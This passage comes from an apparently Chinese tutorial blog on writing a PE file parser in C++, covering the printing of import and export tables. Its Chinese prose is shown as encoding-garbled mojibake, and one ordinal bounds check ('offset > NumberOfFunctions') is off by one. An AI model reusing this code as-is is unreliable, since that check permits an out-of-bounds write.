é˜²æ­¢è¶Šç•Œè¯»</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%02d] Name: %s\n            Hint: 0x%X\n            Call via: 0x%X (RVA)\n"</span>,<br>j + <span class="hljs-number">1</span>, hint.Name, hint.Hint, <br>import_dir_table_entries[i].FirstThunk + j * <span class="hljs-built_in">sizeof</span>(DWORD));<br>}<br><span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// æŒ‰ç…§åºå·å¯¼å…¥</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%d] Ordinal: 0x%X\n"</span>, j + <span class="hljs-number">1</span>, name_rva &amp; <span class="hljs-number">0xffff</span>);<br>}<br>}<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n"</span>);<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/11.png"></p><h3 id="Step-3-2-è§£æPEå¯¼å‡ºè¡¨ï¼ˆ-edataï¼‰"><a href="#Step-3-2-è§£æPEå¯¼å‡ºè¡¨ï¼ˆ-edataï¼‰" class="headerlink" title="Step 3.2: è§£æPEå¯¼å‡ºè¡¨ï¼ˆ.edataï¼‰"></a>Step 3.2: è§£æPEå¯¼å‡ºè¡¨ï¼ˆ.edataï¼‰</h3><ul><li><code>.edata</code>åŒ…å«æœ‰å…³å…¶ä»–é•œåƒå¯ä»¥é€šè¿‡åŠ¨æ€é“¾æ¥è®¿é—®çš„ç¬¦å·ä¿¡æ¯ï¼Œé€šå¸¸åŒ…å«åœ¨DLLä¸­[14]ã€‚</li></ul><table><thead><tr><th align="left">è¡¨åç§°</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">å¯¼å‡ºç›®å½•è¡¨</td><td align="left">åªæœ‰ä¸€è¡Œçš„è¡¨ï¼ˆä¸è°ƒè¯•ç›®å½•ä¸åŒï¼‰ã€‚ æ­¤è¡¨æŒ‡ç¤ºå…¶ä»–å¯¼å‡ºè¡¨çš„ä½ç½®å’Œå¤§å°ã€‚</td></tr><tr><td align="left">å¯¼å‡ºåœ°å€è¡¨</td><td align="left">å¯¼å‡ºç¬¦å·çš„ RVA æ•°ç»„ã€‚ è¿™äº›æ˜¯å¯æ‰§è¡Œä»£ç å’Œæ•°æ®èŠ‚ä¸­çš„å¯¼å‡ºå‡½æ•°å’Œæ•°æ®çš„å®é™…åœ°å€ã€‚ å…¶ä»–æ˜ åƒæ–‡ä»¶å¯ä»¥ä½¿ç”¨æ­¤è¡¨çš„ç´¢å¼•ï¼ˆåºå·ï¼‰æˆ–è€…ï¼ˆå¯é€‰ï¼‰ä½¿ç”¨ä¸åºå·å¯¹åº”çš„å…¬å…±åç§°ï¼ˆå¦‚æœå®šä¹‰äº†å…¬å…±åç§°ï¼‰å¯¼å…¥ç¬¦å·ã€‚</td></tr><tr><td align="left">åç§°æŒ‡é’ˆè¡¨</td><td align="left">æŒ‡å‘å…¬å…±å¯¼å‡ºåç§°çš„æŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‰å‡åºæ’åºã€‚</td></tr><tr><td align="left">åºå·è¡¨</td><td align="left">å¯¹åº”äºåç§°æŒ‡é’ˆè¡¨çš„æˆå‘˜çš„åºå·æ•°ç»„ã€‚ å¯¹åº”å…³ç³»æŒ‰ä½ç½®ï¼Œå› æ­¤ï¼Œåç§°æŒ‡é’ˆè¡¨å’Œåºå·è¡¨çš„æˆå‘˜æ•°å¿…é¡»ç›¸åŒã€‚ æ¯ä¸ªåºå·éƒ½æ˜¯å¯¼å‡ºåœ°å€è¡¨ä¸­çš„ç´¢å¼•ã€‚</td></tr><tr><td align="left">å¯¼å‡ºåç§°è¡¨</td><td align="left">ä¸€ç³»åˆ—ä»¥ null ç»“å°¾çš„ ASCII å­—ç¬¦ä¸²ã€‚ åç§°æŒ‡é’ˆè¡¨çš„æˆå‘˜æŒ‡å‘æ­¤åŒºåŸŸã€‚ è¿™äº›åç§°æ˜¯ç”¨äºå¯¼å…¥å’Œå¯¼å‡ºç¬¦å·çš„å…¬å…±åç§°ï¼Œå®ƒä»¬ä¸ä¸€å®šä¸æ˜ åƒæ–‡ä»¶ä¸­ä½¿ç”¨çš„ä¸“ç”¨åç§°ç›¸åŒã€‚</td></tr></tbody></table><hr><p><strong>1. å¯¼å‡ºç›®å½•è¡¨</strong></p><ul><li>å­—æ®µå¦‚ä¸‹æ‰€ç¤º[14]ï¼Œå…¶ä¸­é‡è¦çš„å­—æ®µå·²åŠ ç²—å¤„ç†ï¼š</li></ul><table><thead><tr><th align="left">åç§»é‡</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">å¯¼å‡ºæ ‡å¿—</td><td align="left">ä¿ç•™ï¼Œå¿…é¡»ä¸º 0ã€‚</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">æ—¶é—´/æ—¥æœŸæˆ³</td><td align="left">åˆ›å»ºå¯¼å‡ºæ•°æ®çš„æ—¶é—´å’Œæ—¥æœŸã€‚</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">ä¸»è¦ç‰ˆæœ¬</td><td align="left">ä¸»ç‰ˆæœ¬å·ã€‚ ç”¨æˆ·å¯ä»¥è®¾ç½®ä¸»è¦ç‰ˆæœ¬å·å’Œæ¬¡è¦ç‰ˆæœ¬å·ã€‚</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">æ¬¡è¦ç‰ˆæœ¬</td><td align="left">æ¬¡ç‰ˆæœ¬å·ã€‚</td></tr><tr><td align="left">12</td><td align="left">4</td><td align="left"><strong>åç§° RVA</strong></td><td align="left">åŒ…å« DLL åç§°çš„ ASCII å­—ç¬¦ä¸²çš„åœ°å€ã€‚ æ­¤åœ°å€ç›¸å¯¹äºæ˜ åƒåŸºå€ã€‚</td></tr><tr><td align="left">16</td><td align="left">4</td><td align="left"><strong>åºå·åŸº</strong></td><td align="left">æ­¤æ˜ åƒä¸­çš„å¯¼å‡ºçš„èµ·å§‹åºå·ã€‚ æ­¤å­—æ®µæŒ‡å®šå¯¼å‡ºåœ°å€è¡¨çš„èµ·å§‹åºå·ã€‚ <strong>é€šå¸¸è®¾ç½®ä¸º 1ã€‚</strong></td></tr><tr><td align="left">20</td><td align="left">4</td><td align="left"><strong>åœ°å€è¡¨æ¡ç›®</strong></td><td align="left">å¯¼å‡ºåœ°å€è¡¨ä¸­çš„æ¡ç›®æ•°ã€‚</td></tr><tr><td align="left">24</td><td align="left">4</td><td align="left"><strong>åç§°æŒ‡é’ˆæ•°</strong></td><td align="left">åç§°æŒ‡é’ˆè¡¨ä¸­çš„æ¡ç›®æ•°ã€‚ ä¹Ÿæ˜¯åºå·è¡¨ä¸­çš„æ¡ç›®æ•°ã€‚</td></tr><tr><td align="left">28</td><td align="left">4</td><td align="left"><strong>å¯¼å‡ºåœ°å€è¡¨ RVA</strong></td><td align="left">å¯¼å‡ºåœ°å€è¡¨ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åœ°å€ã€‚</td></tr><tr><td align="left">32</td><td align="left">4</td><td align="left"><strong>åç§°æŒ‡é’ˆ RVA</strong></td><td align="left">å¯¼å‡ºåç§°æŒ‡é’ˆè¡¨ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åœ°å€ã€‚ è¡¨å¤§å°ç”±â€œåç§°æŒ‡é’ˆæ•°â€å­—æ®µç»™å‡ºã€‚</td></tr><tr><td align="left">36</td><td align="left">4</td><td align="left"><strong>åºå·è¡¨RVA</strong></td><td align="left">åºå·è¡¨ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åœ°å€ã€‚</td></tr></tbody></table><p><strong>2. å¯¼å‡ºåœ°å€è¡¨EAT</strong></p><ul><li>å¯ä»¥æŠŠEATç†è§£ä¸ºä¸€ä¸ªå­˜æ”¾å¯¼å‡ºåœ°å€çš„RVAæ•°ç»„ï¼ˆ4å­—èŠ‚ä¸ºä¸€ä¸ªRVAï¼‰ï¼Œç„¶åæ ¹æ®RVAå»æ‰¾åˆ°å…·ä½“ç¬¦å·çš„å¯¼å‡ºåœ°å€</li></ul><table><thead><tr><th align="left">åç§»</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">å¯¼å‡ºRVA</td><td align="left">åŠ è½½åˆ°å†…å­˜ä¸­æ—¶å¯¼å‡ºç¬¦å·ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åœ°å€ã€‚ ä¾‹å¦‚ï¼Œ<strong>å¯¼å‡ºå‡½æ•°çš„åœ°å€</strong>ã€‚</td></tr><tr><td align="left">0</td><td align="left">4</td><td align="left">è½¬å‘å™¨ RVA</td><td align="left">æŒ‡å‘å¯¼å‡ºèŠ‚ä¸­ä»¥ null ç»“å°¾çš„ ASCII å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚ æ­¤å­—ç¬¦ä¸²å¿…é¡»åœ¨å¯¼å‡ºè¡¨æ•°æ®ç›®å½•æ¡ç›®ç»™å®šçš„èŒƒå›´å†…ã€‚</td></tr></tbody></table><p><strong>3. åç§°æŒ‡é’ˆRVA</strong></p><ul><li>è¿™ä¸ªä¹Ÿæ˜¯ä¸€ä¸ªå­˜æ”¾åç§°å­—ç¬¦ä¸²RVAï¼ˆ4å­—èŠ‚ï¼‰çš„æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„æ˜¯ä¹±åºçš„ï¼Œå¦‚æœè¦æ¢å¤å…¶é¡ºåºï¼Œåˆ™éœ€è¦ä½¿ç”¨åºå·è¡¨RVAä¸­çš„ä¿¡æ¯</li></ul><p><strong>4. åºå·è¡¨</strong></p><ul><li><p>åºå·è¡¨é¡ºåºä¸åç§°æŒ‡é’ˆè¡¨é¡ºåºä¸€è‡´ï¼Œä¸å¯¼å‡ºåœ°å€è¡¨é¡ºåºä¸ä¸€è‡´ï¼Œéœ€è¦æ ¹æ®åºå·è¡¨è¿›è¡Œæ¢å¤ã€‚</p></li><li><p>å­˜å‚¨ç¬¦å·é¡ºåºçš„è¡¨ï¼Œä¸º<strong>16ä½</strong>æ— åç´¢å¼•æ•°ç»„ï¼›è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒçœŸæ­£çš„ï¼ˆbiasedï¼‰åºå·ç­‰äºå¯¼å‡ºç›®å½•è¡¨ä¸­çš„åºå·åŸº + è¯¥16ä½æ— åå€¼</p></li><li><p>ä¸¾ä¸ªä¾‹å­ï¼Œåºå·è¡¨ç¬¬ä¸€ä¸ª16ä½ä¸º03ï¼Œè€Œç›¸åº”çš„åç§°æŒ‡é’ˆæ•°ç»„ç¬¬ä¸€ä¸ªRVAæ‰€è¡¨ç¤ºçš„å­—ç¬¦ä¸²<code>AboutDlgProc</code>ï¼Œåºå·åŸºä¸º01ï¼Œé‚£ä¹ˆä¸Šè¿°ä¿¡æ¯å¯è¡¨è¿°ä¸ºåºå·04çš„å‡½æ•°ä¸º<code>AboutDlgProc</code>ï¼Œå…¶å¯¼å‡ºåœ°å€ä¸ºå¯¼å‡ºåœ°å€è¡¨ä¸­ç¬¬<strong>4</strong>ä¸ªå€¼ <code>9840</code>ã€‚</p></li><li><p>å›¾è§£æ•´ä¸ªå¯»å€æµç¨‹ï¼š</p></li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.svg"></p><hr><ul><li><p>è§£ææµç¨‹ï¼š</p><ul><li><p>å…ˆè§£æå¯¼å‡ºç›®å½•è¡¨ï¼Œå¾—åˆ°å¯¼å‡ºè¡¨çš„åç§°æŒ‡é’ˆï¼Œå¹¶å–å¾—å…¶åç§°ï¼›</p></li><li><p>å…¶æ¬¡ï¼Œç”±äºå¯¼å‡ºè¡¨é¡¹çš„åºå·æ˜¯ä¹±åºçš„ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªå¯¼å‡ºè¡¨é¡¹çš„å®ä½“ç”¨æ¥å­˜å‚¨å¯¼å‡ºè¡¨é¡¹çš„å†…å®¹ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__EXPORT_ENTRY</span> {<br>WORD  ordinal;<br>DWORD function_rva;<br>DWORD name_rva;<br><span class="hljs-type">char</span>  name[<span class="hljs-number">100</span>];<br>}EXPORT_ENTRY, *PEXPORT_ENTRY;<br></code></pre></td></tr></tbody></table></figure></li><li><p>ç„¶åï¼Œæˆ‘ä»¬æ ¹æ®å¯¼å‡ºè¡¨é¡¹çš„åœ°å€è¡¨æ¡ç›®æ•°[<code>NumberOfFunctions</code>]æ¥åˆ›å»ºæŒ‡å®šä¸ªæ•°çš„å¯¼å‡ºè¡¨é¡¹å®ä½“ï¼Œå¹¶æ ¹æ®å¯¼å‡ºç›®å½•è¡¨ä¸­çš„åç§°æŒ‡é’ˆè¡¨å’Œåºå·è¡¨çš„å†…å®¹æ‰¾åˆ°æŒ‡å®šçš„å¯¼å‡ºè¡¨å®ä½“ï¼Œå¹¶æ›´æ–°å…¶å­—æ®µå†…å®¹ï¼›</p></li><li><p>æœ€åï¼Œå°†æ›´æ–°åçš„å¯¼å‡ºè¡¨å®ä½“æŒ‰ç…§ordinalçš„é¡ºåºæ‰“å°å‡ºæ¥</p></li></ul></li><li><p>å¤„ç†ä»£ç ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_export_directory</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><span class="hljs-keyword">if</span> (!export_dir_table_size || !export_dir_table_rva) <span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table_rva), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;export_dir_table, <span class="hljs-built_in">sizeof</span>(___IMAGE_EXPORT_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// å…¶ä»–æ“ä½œå°±è®©printå‡½æ•°å»å®Œæˆ:))</span><br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_export_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br>DWORD name_offset, name_size, i;<br>DWORD* name_p_table, *export_address_table;<br>WORD* ord_table;<br><span class="hljs-type">char</span> *name_tmp, ch;<br>PEXPORT_ENTRY export_entries;<br><br><span class="hljs-keyword">if</span> (!export_dir_table_size || !export_dir_table_rva) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"====No export table===\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======Export table====\n\n"</span>);<br><br><span class="hljs-comment">// å…ˆè§£æå¯¼å‡ºç›®å½•è¡¨</span><br><span class="hljs-comment">// 1. å…ˆè§£æå¯¼å‡ºè¡¨åç§°</span><br>name_offset = <span class="hljs-built_in">va_to_raw</span>(export_dir_table.Name);<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">256</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: DLL's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Name: %s (raw offset: 0x%X)\n"</span>, name_tmp, name_offset);<br><span class="hljs-built_in">free</span>(name_tmp);<br><br><span class="hljs-comment">// 2.è§£æå„ä¸ªå¯¼å‡ºé¡¹</span><br><span class="hljs-comment">// å…ˆæ„é€ è‡ªå®šä¹‰çš„å®ä½“</span><br><br><span class="hljs-keyword">if</span> (export_dir_table.NumberOfFunctions &lt; export_dir_table.NumberOfNames) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Seriously?! Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (export_dir_table.NumberOfFunctions &gt; <span class="hljs-number">0xFFFF</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many functions exported (&gt;65535).\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>export_entries = (PEXPORT_ENTRY)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(EXPORT_ENTRY) * export_dir_table.NumberOfFunctions);<br><br><span class="hljs-comment">// è§£æå¯¼å‡ºåœ°å€è¡¨</span><br>export_address_table = (DWORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(DWORD) * export_dir_table.NumberOfFunctions);<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfFunctions), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(export_address_table, <span class="hljs-built_in">sizeof</span>(DWORD), export_dir_table.NumberOfFunctions, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size ^ export_dir_table.NumberOfFunctions) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// åˆå§‹åŒ–</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfFunctions; i++) {<br>export_entries[i].ordinal = export_dir_table.Base + i;<br>export_entries[i].function_rva = export_address_table[i];<br>export_entries[i].name_rva = <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-built_in">free</span>(export_address_table);<br><br><span class="hljs-comment">// è§£æåç§°æŒ‡é’ˆè¡¨å’Œåºå·è¡¨</span><br><br>name_p_table = (DWORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(DWORD) * export_dir_table.NumberOfNames);<br>ord_table = (WORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(WORD) * export_dir_table.NumberOfNames);<br><br><span class="hljs-keyword">if</span> (!name_p_table || !ord_table) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_p_table or ord_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfNames), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(name_p_table, <span class="hljs-built_in">sizeof</span>(DWORD), export_dir_table.NumberOfNames, pe_fp);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfNameOrdinals), SEEK_SET);<br>read_size ^= <span class="hljs-built_in">fread</span>(ord_table, <span class="hljs-built_in">sizeof</span>(WORD), export_dir_table.NumberOfNames, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfNames; i++) {<br><br>WORD offset = *(WORD*)(ord_table + i);<br><br><span class="hljs-keyword">if</span> (offset &gt; export_dir_table.NumberOfFunctions) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>export_entries[offset].name_rva = *(DWORD*)(name_p_table + i);<br>name_offset = <span class="hljs-built_in">va_to_raw</span>(*(DWORD*)(name_p_table + i));<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">99</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Function's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><br><span class="hljs-built_in">memcpy</span>(export_entries[offset].name, name_tmp, name_size + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(name_tmp);<br><br>}<br><br><span class="hljs-built_in">free</span>(name_p_table);<br><span class="hljs-built_in">free</span>(ord_table);<br><br><span class="hljs-comment">// æ‰“å°</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Export Entries:\n\n"</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfFunctions; i++) {<br><br><span class="hljs-keyword">if</span> (!export_entries[i].function_rva)<br><span class="hljs-built_in">memcpy</span>(export_entries[i].name, <span class="hljs-string">"-"</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">else</span><br>export_entries[i].name[<span class="hljs-number">99</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// é˜²æ­¢è¶Šç•Œè¯»</span><br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    [%02d] Ordinal: %d\n"</span><br><span class="hljs-string">"           Function RVA: 0x%X\n"</span><br><span class="hljs-string">"           Name: %s (RVA: 0x%X)\n\n"</span>,<br>i + <span class="hljs-number">1</span>, export_entries[i].ordinal, export_entries[i].function_rva, <br>export_entries[i].name, export_entries[i].name_rva);<br>}<br><br><br><span class="hljs-built_in">free</span>(export_entries);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/13.png"></p><h3 id="Step-3-3-è§£æé‡å®šä½è¡¨ï¼ˆ-relocï¼‰"><a href="#Step-3-3-è§£æé‡å®šä½è¡¨ï¼ˆ-relocï¼‰" 